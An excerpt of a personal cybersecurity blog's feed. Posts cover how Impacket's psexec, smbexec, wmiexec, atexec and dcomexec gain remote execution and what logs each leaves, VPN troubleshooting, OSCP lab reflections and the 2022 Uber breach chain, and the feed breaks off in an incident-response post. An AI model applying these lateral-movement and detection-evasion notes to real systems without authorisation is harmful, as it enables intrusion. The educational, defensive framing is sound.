&lt;p&gt;In honesty, there’ve been times when I thought about quitting because the pressures that I would put on myself would be so extreme. I think that I would face this struggle in any career I enter just due to my personality. Everyone that knows me personally has told me that I will be successful and high-achieving. Somehow, I’ve convinced myself that I am not good/smart enough to accomplish these things and that is really sad. I think that this will get better, though, because I’ve discovered some things that have worked for me in the past. Until then, this has been my experience following the exam.&lt;/p&gt;
&lt;h1 id=&#34;next-steps&#34;&gt;Next Steps&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*CVPmxaTzJ_GYmftJ&#34; alt=&#34;&#34;  /&gt;

I’m still deciding on the best ways to allocate my time, but I’m considering doing some combination of these things (subject to change):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Contributing more to open-source projects&lt;/li&gt;
&lt;li&gt;Creating my own cybersecurity coding projects/tools&lt;/li&gt;
&lt;li&gt;Speaking at a cybersecurity conference&lt;/li&gt;
&lt;li&gt;Strengthening my web application security skills&lt;/li&gt;
&lt;li&gt;Attempt bug bounty hunting&lt;/li&gt;
&lt;li&gt;Expanding my network and looking for more opportunities&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I’m looking to improve both my hard and soft skills while going to high-school full-time. Moving forward, I would like to share more of my journey and hopefully help to strengthen a community of young professionals such as myself.&lt;/p&gt;
&lt;p&gt;If you have any questions, my inbox is open. Please reach out to &lt;a href=&#34;mailto:allypetitt@gmail.com&#34;&gt;allypetitt@gmail.com&lt;/a&gt;. Thanks for reading!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Windows Remoting: Difference between psexec, wmiexec, atexec, *exec</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</link>
      <pubDate>Fri, 09 Dec 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you’re anything like me, you discovered &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt;, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.&lt;/p&gt;
&lt;h1 id=&#34;psexec&#34;&gt;PsExec&lt;/h1&gt;
&lt;p&gt;PsExec works by writing a randomly-named binary to the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc create [serviceName] binPath= &amp;#34;C:\Windows\[uploaded-binary].exe&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;All of your command input and output occurs over the named pipe via SMB (445/TCP).&lt;/p&gt;
&lt;p&gt;As pointed out by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png&#34; alt=&#34;Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see, the logs showed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1 System Event IDs: 7045 (Service Started)&lt;/li&gt;
&lt;li&gt;12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;smbexec--the-next-logicalstep&#34;&gt;SmbExec- the next logical step&lt;/h1&gt;
&lt;p&gt;SmbExec works similarly to PsExec. The main difference is that PsExec will upload a &lt;code&gt;.exe&lt;/code&gt; file to the &lt;code&gt;ADMIN$&lt;/code&gt; share while SmbExec uploads a &lt;code&gt;.bin&lt;/code&gt; file along with a temporary file.&lt;/p&gt;
&lt;p&gt;If you’re interested in learning how to replicate this manually, &lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;HackTricks&lt;/a&gt; has a section demonstrating how to do so.&lt;/p&gt;
&lt;p&gt;Referencing the images from &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*-KV26ONRuN8dlFWy.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*MsVaNUTQpbyjLkci.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The resulting logs are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout)&lt;/li&gt;
&lt;li&gt;3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;wmiexec-psexec&#34;&gt;Wmiexec &amp;gt; Psexec?&lt;/h1&gt;
&lt;p&gt;WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (&amp;gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.&lt;/p&gt;
&lt;p&gt;The user sends input to the remote host over the random port. The input is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output is written to a file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. The filename starts with &lt;code&gt;__&lt;/code&gt;, followed by the timestamp.&lt;/p&gt;
&lt;p&gt;The advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.&lt;/p&gt;
&lt;p&gt;In addition, you can utilize WMI for remote access via the program &lt;code&gt;pth-wmis&lt;/code&gt; which comes preinstalled with Kali Linux.&lt;/p&gt;
&lt;p&gt;Again, we can view the log output of a connection, executing a single command, and exiting as demonstrated by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*TzXqdM8qKIHbTsMN.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The result is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you’re interested in learning more about WmiExec, &lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;this article&lt;/a&gt; goes into detail about how it works on a low level and how it is detected.&lt;/p&gt;
&lt;h1 id=&#34;atexec&#34;&gt;AtExec&lt;/h1&gt;
&lt;p&gt;This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with &lt;code&gt;cmd.exe&lt;/code&gt; and the output of the command (&lt;code&gt;STDERR&lt;/code&gt;and &lt;code&gt;STDERR&lt;/code&gt;) is written in a temporary file in the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share. AtExec retrieves the value of this file before deleting it.&lt;/p&gt;
&lt;h1 id=&#34;dcomexec&#34;&gt;DcomExec&lt;/h1&gt;
&lt;p&gt;This program uses the &lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0&#34;&gt;Distributed Component Object Model (DCOM)&lt;/a&gt; protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained &lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;here&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its &lt;code&gt;ExecuteShellCommand&lt;/code&gt; method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;tldr&#34;&gt;TLDR;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PsExec works over SMB by uploading a &lt;code&gt;.exe&lt;/code&gt; file that creates a named pipe between you and the remote host&lt;/li&gt;
&lt;li&gt;SmbExec works similarly, except instead of a &lt;code&gt;.exe&lt;/code&gt; file, it uses a &lt;code&gt;.bin&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.&lt;/li&gt;
&lt;li&gt;AtExec works through executing scheduled tasks in SMB&lt;/li&gt;
&lt;li&gt;DcomExec uses the DCOM protocol with RPC to execute commands&lt;/li&gt;
&lt;li&gt;They all look different in logs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope you learned something because I certainly did.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Attacking Windows: Performing Lateral Movement with Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/no_psexec_needed/&#34;&gt;https://www.trustedsec.com/blog/no_psexec_needed/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;other-exec-tools-that-you-can-learn-moreabout&#34;&gt;Other “exec” tools that you can learn more about&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skorov/scexec&#34;&gt;ScExec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&#34;&gt;MsiExec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>VPN Troubleshooting: How to fix “Inactivity Timeout ( — ping-restart)”</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-11-12_vpn-troubleshooting--inactivity-timeout-----ping-restart--a52791c24a50/</link>
      <pubDate>Sat, 12 Nov 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-11-12_vpn-troubleshooting--inactivity-timeout-----ping-restart--a52791c24a50/</guid>
      <description>&lt;p&gt;If your VPN log looks something like this:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*1SN24_SvT2cN2X0GeX-DUA.png&#34; alt=&#34;&#34;  /&gt;

I’m here to help. During my time working through the PEN-200 labs, I’ve faced the constant struggle of losing connection to the host every few minutes to seconds. I tried to troubleshoot this “Inactivity Timeout” error with an Offsec employee for 3 hours to no avail. Finally, I figured out the solution and I am here to share it with those of you who have the same struggle.&lt;/p&gt;
&lt;h1 id=&#34;cause-of-thiserror&#34;&gt;Cause of This Error&lt;/h1&gt;
&lt;p&gt;In a successful OpenVPN connection, the VPN server will send pings to the client to ensure that the VPN connection is still active. If the ping is not received by the client, the server knows that the VPN is disconnected and attempts to reset the connection. This is when the message “Inactivity timeout ( — ping-restart)” appears in the VPN log.&lt;/p&gt;
&lt;h1 id=&#34;reason-1-firewalls&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*GCaxAU5pr5MvU-aF5ujO7w.png&#34; alt=&#34;VPN server with arrow titled “ping” pointing towards VPN client&#34;  /&gt;

Reason #1: Firewalls&lt;/h1&gt;
&lt;p&gt;A potential cause for this error, which is often overlooked, is a running &lt;strong&gt;firewall&lt;/strong&gt;. This was the primary reason that I was seeing the errors as I was unaware that my firewall was interfering with the VPN connection, and I had another firewall that I didn’t know was running. Linux users, you can check the firewall status with the following commands:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo systemctl status ufw  
sudo systemctl status firewalld
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the firewall is running, it is possible that this is the reason you are having VPN issues. To fix this, either &lt;strong&gt;disable the firewall or change its configuration to not interfere with your VPN connection.&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;reason-2-multiple-vpn-connections-atonce&#34;&gt;Reason #2: Multiple VPN connections at once&lt;/h1&gt;
&lt;p&gt;Another possible cause of this error is when running two &lt;code&gt;openvpn&lt;/code&gt; clients with the same profile from different computers. Make sure that you’re not running the VPN in your virtual machine and host OS at the same time. If your setup looks something like this:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c25ACGc0dibyMqgCdBy9Xw.png&#34; alt=&#34;Host computer with openvpn running with virtual machine that also have openvpn running&#34;  /&gt;

There’s a chance that this is the reason for your troubles. To solve this, &lt;strong&gt;pick one VM to work in and kill any of your other VPN connections&lt;/strong&gt;. You can use this command in the terminal to ensure that &lt;code&gt;openvpn&lt;/code&gt; is no longer running.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;killall -e openvpn
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;reason-3-dns-name-resolution&#34;&gt;Reason #3: DNS Name Resolution&lt;/h1&gt;
&lt;p&gt;Additionally, if running &lt;code&gt;ping [www.google.com](http://www.google.como)&lt;/code&gt; results in the message:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*fGnBltujryQ_p2CLOjUAiw.png&#34; alt=&#34;Picture showing error message “ping: www.google.com: Name or service not known”&#34;  /&gt;

You probably need to &lt;strong&gt;add a working nameserver to your&lt;/strong&gt; &lt;code&gt;**/etc/resolv.conf**&lt;/code&gt; &lt;strong&gt;file&lt;/strong&gt;. For example, your &lt;code&gt;/etc/resolve.con&lt;/code&gt; may look like this once you add the working nameservers:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*QygUgBksC3lNe-XBgKPG9A.png&#34; alt=&#34;&#34;  /&gt;

Note: &lt;code&gt;1.1.1.1&lt;/code&gt; is the public DNS resolver from Cloudflare and &lt;code&gt;8.8.8.8&lt;/code&gt; is from Google. For more details regarding configuration, look at &lt;a href=&#34;https://www.shellhacks.com/setup-dns-resolution-resolvconf-example/&#34;&gt;this article&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;reasons-412&#34;&gt;Reasons #4–12&lt;/h1&gt;
&lt;p&gt;These are additional reasons that I found in &lt;a href=&#34;https://www.sparklabs.com/support/kb/article/error-inactivity-timeout-ping-restart/&#34;&gt;this article&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Address or port of VPN server is incorrect&lt;/li&gt;
&lt;li&gt;VPN server is offline&lt;/li&gt;
&lt;li&gt;Network between your computer and the server dropped out&lt;/li&gt;
&lt;li&gt;The ping and ping-restart values are invalid or don’t match&lt;/li&gt;
&lt;li&gt;Configuration problems&lt;/li&gt;
&lt;li&gt;Your country may attempt to take down your VPN connection for censorship purposes&lt;/li&gt;
&lt;li&gt;NAT router that blocks your connection&lt;/li&gt;
&lt;li&gt;Firewall on your router&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;additional-reading&#34;&gt;Additional Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.sparklabs.com/support/kb/article/error-inactivity-timeout-ping-restart/&#34;&gt;https://www.sparklabs.com/support/kb/article/error-inactivity-timeout-ping-restart/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>What the Pen-200 Has Taught Me About Pentesting Methodology</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-11-02_what-the-pen-200-has-taught-me-about-pentesting-methodology-1fd67760be5c/</link>
      <pubDate>Wed, 02 Nov 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-11-02_what-the-pen-200-has-taught-me-about-pentesting-methodology-1fd67760be5c/</guid>
      <description>&lt;p&gt;The Pen-200 is the prerequisite course for the OSCP exam. As such, the writeups for the labs are incredibly difficult to find. As someone who has relied heavily on the accessibility of HTB walkthroughs, I’ve never been in an environment where I wasn’t one Google search away from figuring out the next step in solving a box. Needless to say, 0xdf couldn’t help me much with the Pen-200 labs.&lt;/p&gt;
&lt;p&gt;The Pen-200 labs were a struggle not because I was incompetent, but because I didn’t have enough practice reaching dead ends. I didn’t spend enough time in rabbit holes, therefore I wouldn’t realize when I was in one. I didn’t know how to search for details that I might have missed on my first look. When trying to solve a box, I learned that sometimes the vulnerability could be found just by Googling a word that I was not entirely familiar with on the&lt;code&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
&lt;p&gt;My journey began with referencing writeups on HTB, but when I no longer could, I learned how to use cheatsheets on the internet. Some of my most notable mentions are &lt;a href=&#34;https://book.hacktricks.xyz/welcome/readme&#34;&gt;HackTricks&lt;/a&gt; and &lt;a href=&#34;https://kashz.gitbook.io/kashz-jewels/&#34;&gt;Kashz Jewels&lt;/a&gt;. When I found an open port, I would ensure that I went through every enumeration step that I found on these cheat sheets. It was still a slight crutch, but it did allow me to develop methodologies that I wasn’t getting by relying solely on writeups.&lt;/p&gt;
&lt;p&gt;Eventually, thoroughly enumerating the services became second nature and I became better at quickly identifying vulnerabilities in the virtual machines. I learned to search for CVEs for any software that I found running and I learned to do more thorough experimentation with user input fields and query parameters. I learned how to troubleshoot the errors that I was getting on my system when trying to run an exploit.&lt;/p&gt;
&lt;p&gt;I am feeling very confident in my abilities to hack into the lab systems and am beginning to look towards something more challenging such as Proving Grounds in preparation for the OSCP.&lt;/p&gt;
&lt;h2 id=&#34;key-takeaways&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*xcyov1D0RvoqVZfj.jpg&#34; alt=&#34;&#34;  /&gt;

Key Takeaways&lt;/h2&gt;
&lt;p&gt;This process of feeling helpless with gradual progress towards becoming self-reliant and resourceful has taught me an important lesson about cybersecurity which is this: methodology is key. Methodology might be the single largest difference in my pen-testing abilities before and after the Pen-200. I learned how to consistently find vulnerabilities and how to reliably exploit them. And methodology is best developed through repetition and exposing yourself to a variety of different machines. Each one requires a slightly different approach which creates a more complete methodology.&lt;/p&gt;
&lt;p&gt;In addition, note-taking is powerful. Taking frequent screenshots and saving the output of scans into a file will save time when wanting to look back at scan results and it will allow for further refinement of your methodology.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How Did an 18-Year-Old Hack Uber?</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-09-24_how-did-an-18-year-old-hack-uber--788f092b9dc3/</link>
      <pubDate>Sat, 24 Sep 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-09-24_how-did-an-18-year-old-hack-uber--788f092b9dc3/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*p8HCs81YRFvhgaR3.jpg&#34; alt=&#34;&#34;  /&gt;

An 18-year-old hacker gained admin access to Uber on September 15, 2022. These are the steps that the hacker took:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The hacker obtained an Uber employee’s phone number.&lt;/li&gt;
&lt;li&gt;He directed the employee to a phishing site that looked like an Uber login page. The employee logged in and the hacker gained his credentials.&lt;/li&gt;
&lt;li&gt;The hacker tried to get around the MFA by doing a Multi-Factor Authentication Fatigue attack. This attack consists of spamming MFA requests to the employee until he gets annoyed enough to allow the login attempt to go through.&lt;/li&gt;
&lt;li&gt;He continued the attack for over an hour before changing tactics. He contacted the employee on WhatsApp claiming to be on the IT team. He said that in order for the spamming to stop, he must accept the request.&lt;/li&gt;
&lt;li&gt;The employee accepted the request and the hacker gained access to the network.&lt;/li&gt;
&lt;li&gt;The hacker found network shares with PowerShell scripts that contained hard-coded admin credentials.&lt;/li&gt;
&lt;li&gt;The hacker used the username and password of the admin to gain access to Amazon Web Services (AWS), GSuite, DA, DUO, OneLogin, Uber security dashboards, and their financial data.&lt;/li&gt;
&lt;li&gt;He continued to vandalize reports on Uber’s HackerOne bug bounty program before declaring his presence in Uber’s Slack workspace.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*d0qrDND0kRrSzFmQ&#34; alt=&#34;&#34;  /&gt;

The hacker leaked screenshots of the Google Admin panel, Avengers dashboard, security dashboards, and their AWS IAM summary.&lt;/p&gt;
&lt;h1 id=&#34;aftermath&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Nwaj3JZDBIbVPP9y2y9aYQ.png&#34; alt=&#34;Google Admin panel&#34;  /&gt;

&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*aBZc_OpaYL5iYHKQ.jpg&#34; alt=&#34;&#34;  /&gt;

Aftermath&lt;/h1&gt;
&lt;p&gt;Uber’s stock prices dropped by 6% following the day of the breach, lowering its valuation by over $2 billion. The stock prices did eventually recover. Uber responded with a tweet on their PR Twitter account.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*16105fZhVW_EBRmOWDI_hg.png&#34; alt=&#34;Picture of tweet from @Uber_Comms responding to security incident&#34;  /&gt;

Uber followed up by stating that there was no evidence of sensitive user data being stolen, they have notified authorities, and their internal and external applications are operational.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*oeZ-TBZHlybgDJMZbpdCUg.png&#34; alt=&#34;&#34;  /&gt;

They also created a “Security Updates” page on their &lt;a href=&#34;https://www.uber.com/newsroom/security-update&#34;&gt;Uber Newsroom&lt;/a&gt; where they make posts about the developments in their investigation.&lt;/p&gt;
&lt;h1 id=&#34;shifting-blame&#34;&gt;Shifting blame&lt;/h1&gt;
&lt;p&gt;Uber tried to shift the blame towards Lapsus$, an international hacker group that has conducted cyberattacks against large companies and government organizations such as Ubisoft, Nivida, Samsung, and Brazil’s Ministry of Health. It is speculated that Uber is attempting to make their hack less embarrassing by claiming it was done by a more elite organization.&lt;/p&gt;
&lt;h1 id=&#34;most-embarrassing-hackever&#34;&gt;Most Embarrassing Hack Ever?&lt;/h1&gt;
&lt;p&gt;This hack could have been completely avoided had better cybersecurity practices been instilled in Uber. Hard-coded credentials are among the &lt;a href=&#34;https://cwe.mitre.org/top25/archive/2022/2022_cwe_top25.html#cwe_top_25&#34;&gt;2022 CWE top 25&lt;/a&gt; most dangerous software weaknesses. Any cybersecurity professional should be aware of the risk that is involved in having hard-coded credentials in an accessible share. In addition, the employee should not have had access to these sensitive network shares. This goes against the fundamental cybersecurity &lt;a href=&#34;https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege&#34;&gt;principle of least privilege&lt;/a&gt;. This hack is a learning opportunity of how important the fundamentals are when establishing cybersecurity in an organization.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How Companies Respond to Cyber Attacks | The 6 Steps of an Incident Response Plan</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-07-09_how-companies-respond-to-cyber-attacks---the-6-steps-of-an-incident-response-plan-9c6f4267253e/</link>
      <pubDate>Sat, 09 Jul 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-07-09_how-companies-respond-to-cyber-attacks---the-6-steps-of-an-incident-response-plan-9c6f4267253e/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NYCBo5F_MGeRvxzrEm1hsg.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;This article contains information that I have gathered as I’ve done research on incident response. This aims to be actionable for red teamers to know what to look out for and for blue teamers to aid in the creation of an effective incident response plan.&lt;/p&gt;
&lt;h1 id=&#34;key-roles&#34;&gt;Key Roles&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;the CISO ensures cyberattacks are promptly investigated.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;coordinating efforts of incident response during a cyberattack.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;investigating which data may have been stolen.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;containing and securing compromised systems to prevent further damage.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;working with stakeholders to determine incident response plan.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;this role involves ensuring all steps of a data exposure management plan are completed.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;reviewing applicable privacy laws with the General counsel and creating plans of action to ensure that the laws are adhered to.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;the Incident Response Coordinator will update the CISO and members about new events as they take place.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;provide guidance and directing effort in information gathering and documentation.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;gathering and documenting findings of security systems.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;documenting procedural information and appropriate data for Incident Management.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;providing expert opinions in data and technology.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The ERT consists of officials with the authority to make key decisions in Incident Response.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
